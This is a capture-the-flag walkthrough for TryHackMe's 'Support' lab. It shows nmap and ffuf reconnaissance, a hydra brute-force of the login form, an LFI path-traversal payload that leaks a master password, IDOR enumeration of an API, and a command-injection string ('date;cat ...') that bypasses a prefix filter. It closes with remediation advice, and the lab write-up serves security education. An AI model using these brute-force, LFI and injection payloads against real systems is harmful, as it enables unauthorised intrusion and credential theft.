# TryHackMe: Support — Machine Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)

An in-depth penetration testing writeup for the **Support** lab on [TryHackMe](https://tryhackme.com/).
This walkthrough covers enumeration, information disclosure, privilege escalation via cookie manipulation / master credentials, and Remote Code Execution (RCE) through a command-injection filter bypass.

> **Note on redaction:** Passwords and flags in this writeup are **partially masked**. Solve the box yourself to recover the full values.

---

## 🚩 Objectives

1. **Flag 1** — What flag value is displayed after logging in as an administrator?
2. **Flag 2** — What are the contents of `/home/ubuntu/user.txt`?

---

## 🛠️ Tools & Technologies

| Phase | Tooling |
|-------|---------|
| Reconnaissance | `nmap`, `ffuf`, `curl` |
| Bruteforce / Enumeration | `hydra` |
| Exploitation | LFI, IDOR, privilege escalation via cookie manipulation, command injection (RCE) |

---

## 🔍 Step-by-Step Walkthrough

### 1. Reconnaissance & Enumeration

Start with a full TCP port scan to identify running services:

```bash
nmap -sC -sV -O -p- <TARGET_IP>
```

**Scan highlights:**

| Port | Service | Detail |
|------|---------|--------|
| 22/tcp | OpenSSH 9.6p1 | Ubuntu |
| 80/tcp | Apache httpd 2.4.58 | `http-title: Support Operations Panel` |

Map the target to `support.thm`:

```bash
echo "<TARGET_IP> support.thm" | sudo tee -a /etc/hosts
```

#### Directory Fuzzing

Fuzz the web application for hidden paths:

```bash
ffuf -u http://support.thm/FUZZ \
     -w /usr/share/wordlists/dirb/common.txt \
     -e .php,.txt,.bak \
     -mc 200,204,301,302,307,401,403,500
```

**Key findings:**

- `/info.php` — `phpinfo()` page disclosing environment config (`disable_functions` is empty — RCE-friendly).
- `/includes/` — directory listing enabled (`skin.php`, `header.php`).
- `/config.php` — web application configuration file.
- `/dashboard.php` — main user panel (redirects unauthenticated users).
- `/api.php` — backend API endpoint.

---

### 2. Initial Access

Brute-force the login form for the helpdesk user `help@support.thm`:

```bash
hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt \
      support.thm http-post-form \
      "/:email=^USER^&password=^PASS^:Invalid credentials" -V
```

**Credentials discovered:**

- **Email:** `help@support.thm`
- **Password:** `sn****`

Logging in grants access to the basic Helpdesk Dashboard.

---

### 3. Local File Inclusion (LFI) & Configuration Leak

Reviewing `dashboard.php` reveals a theme-selector parameter: `?skin=`.

#### Exploit Mechanism

The backend includes skin files with this logic:

```php
include("skins/" . $_GET['skin'] . ".php");
```

Because the `.php` extension is appended automatically, relative path traversal lets us read internal PHP files **without** specifying the extension.

Read `config.php`:

```bash
curl -s -b "PHPSESSID=<SESSION_ID>" \
     "http://support.thm/dashboard.php?skin=../config"
```

**Exfiltrated config data (masked):**

```php
$MASTER_PASSWORD = 'support@1**';
$SITE_VER  = '1.0';
$SITE_NAME = 'support_portal';
```

---

### 4. IDOR & Privilege Escalation → Flag 1

#### Discovering the Real Admin Username

Query the internal API at `/api.php`. Iterating the `id` parameter exposes an **Insecure Direct Object Reference (IDOR)**:

```bash
curl -s -b "PHPSESSID=<SESSION_ID>; isITUser=b326b5062b2f0e69046810717534cb09" \
     "http://support.thm/api.php?id=1"
```

**API response:**

```json
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```

#### Administrator Login

The master password `support@1**` is sanitized by stripping special characters (`@`), so the effective credential drops the symbol:

- **Admin email:** `specialadmin@support.thm`
- **Admin password:** `sup****10`

```bash
curl -i -c admin_cookies.txt \
     -d "email=specialadmin@support.thm&password=<REDACTED>" \
     -X POST http://support.thm/
```

> 🚩 **Flag 1:** `THM{I_AM_ADM****}`

---

### 5. Remote Code Execution → Flag 2

#### Analyzing the Vulnerability

As administrator, an **IT Admin Panel** appears with a system-diagnostics dropdown that runs `date` commands (`sys` parameter).

Sending an arbitrary command returns:

```
Only date command is allowed.
```

The backend only validates that the command string **begins with** `date` — a classic prefix check.

#### Bypassing the Command Filter

Chain a valid `date` command with a command separator (`;`) and URL-encode the payload:

```bash
curl -s -b admin_cookies.txt \
     --data-urlencode 'sys=date;cat /home/ubuntu/user.txt' \
     -X POST http://support.thm/dashboard.php
```

**Execution result:**

```html
<div class="alert alert-dark">
    <pre class="mb-0">Wed Jul 15 01:41:19 UTC 2026
THM{GOT_THE_FLAG***}</pre>
</div>
```

> 🚩 **Flag 2:** `THM{GOT_THE_FLAG***}`

---

## 💡 Key Takeaways & Remediation

- **Sanitize shell input.** Never pass raw user input to `system()` / `shell_exec()`. Use strict allow-lists, not prefix checks — `date;` should never survive validation.
- **Prevent LFI.** Avoid dynamic file inclusion built from concatenated user parameters. Use hardcoded routing or a strict mapping table of allowed views.
- **Remove sensitive information.** Secrets, hardcoded master passwords, and `phpinfo()` pages must never reach production.
- **Fix broken access control.** Enforce server-side session/role checks on administrative endpoints instead of trusting client-side cookies (`isITUser`). Add authorization checks to `api.php` to close the IDOR.

---

*Disclaimer: This writeup is created for educational and authorized security testing purposes only.*
